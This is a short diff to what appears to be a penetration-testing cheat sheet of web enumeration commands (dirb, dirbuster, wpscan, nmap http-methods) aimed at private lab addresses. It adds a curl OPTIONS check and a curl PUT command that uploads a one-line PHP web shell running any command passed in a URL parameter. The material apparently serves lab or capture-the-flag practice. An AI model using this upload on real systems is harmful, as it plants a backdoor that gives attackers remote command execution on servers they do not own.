@@ -8,7 +8,8 @@ dirb
 dirbuster
 wpscan --url http://192.168.2.168/ --enumerate u --force --wp-content-dir /wp-content/
 
+curl -v -X OPTIONS 192.168.2.149/test/      //Check for HTTP OPTIONS
 nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.2.149
-
+curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' 192.168.2.149/test/shell.php
 
 
